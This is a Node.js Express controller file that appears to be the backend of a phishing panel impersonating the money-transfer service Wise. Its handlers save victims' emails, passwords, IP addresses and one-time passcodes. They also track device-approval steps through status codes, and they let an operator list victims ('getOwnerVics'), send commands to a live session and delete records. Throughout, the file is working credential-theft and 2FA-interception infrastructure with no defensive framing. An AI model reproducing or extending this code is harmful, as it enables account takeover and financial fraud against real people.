const Wise = require("../models/wiseModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Wise
        .find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await Wise.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Wise.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { email, password, uniqueid, owner, ip } = req.body;
    try {
        await Wise.create({ uniqueid, email, password, status: 1, owner, ip });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { email, password, uniqueid } = req.body;
    try {
        await Wise.findOneAndUpdate({ uniqueid }, { email, password, status: 0 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await Wise.findOneAndUpdate({ uniqueid }, { otp, status: 5 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitDevice = async (req, res) => {
    const { approved, uniqueid } = req.body;
    try {
        if (approved) {
            await Wise.findOneAndUpdate({ uniqueid }, { status: 7 }).exec();
        } else {
            await Wise.findOneAndUpdate({ uniqueid }, { status: 3 }).exec();
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Wise.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitDevice,
    deleteEntry,
};
